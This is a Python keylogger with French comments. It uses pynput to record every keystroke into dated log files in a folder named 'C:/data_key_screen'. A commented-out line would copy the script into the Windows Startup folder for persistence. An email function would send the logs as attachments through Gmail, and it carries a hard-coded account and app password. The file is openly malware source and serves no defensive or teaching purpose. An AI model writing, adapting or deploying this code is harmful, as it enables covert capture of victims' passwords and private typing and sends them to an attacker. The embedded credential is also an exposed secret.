from pynput.keyboard import Listener

import os
import logging 
import datetime
import time

from shutil import copyfile

username = os.getlogin()
nomFichierActuelle = os.path.basename(__file__)

# **** AU DEMARRAGE
#copyfile(nomFichierActuelle,f"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{nomFichierActuelle}")
#flm juste creer un raccourci et colle le
# **** EMPLACEMENT SAUVEGARDE
NOM_DOSSIER_SECRET = "C:/data_key_screen"

nomEmplacementSauvegarde = NOM_DOSSIER_SECRET 
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)

dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
datehier = (datetime.datetime.now()++ datetime.timedelta(days=-1)).strftime('%Y-%m-%d')
dateheure = datetime.datetime.now().strftime('%H:%M:%S')



nomEmplacementSauvegarde += "/" + dateajd #dossier à la date de aujourd'hui
if not os.path.exists(nomEmplacementSauvegarde):
	os.makedirs(nomEmplacementSauvegarde)
nomfile = username + " touch " + dateajd + ".txt"
nomfile_hier = username + " touch " + datehier + ".txt"
# **** YEAH SAUGARDES DES TOUCHE SUR FICHIER TXT
logging_dir = nomEmplacementSauvegarde
FORMATT = dateheure + " %(message)s"
logging.basicConfig(filename=f"{logging_dir}/{nomfile}", level=logging.DEBUG, format=FORMATT)

# **** FCT POUR ACTUALISER LE FICHIER DANS ACT

# **** FCT POUR ENVOYER LE BAIL PAR MAIL

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def email_alert(subject,body,to, liste_file=""):
    msg = MIMEMultipart()
    
    msg['subject'] = subject
    msg['to'] = to
    user = "KeyLoggerVeski@gmail.com"
    msg['from'] = user
    password = "sslezqomykvdhggd"
    
    msg.attach(MIMEText(body,'plain'))
    
    for filename in liste_file:
        if os.path.exists(filename):
            attachment = open(filename,"rb")
            part = MIMEBase('application','octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition','attachment; filename=' + filename)
            msg.attach(part)
        else:
            print(filename + " : file not exist")
        
        
    
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(user,password)
    server.send_message(msg)
    
    server.quit()


def on_press(key):        
    print(key)
    logging.info(key)
    
with Listener(on_press=on_press) as lis:
    lis.join()

    
    
    

	  

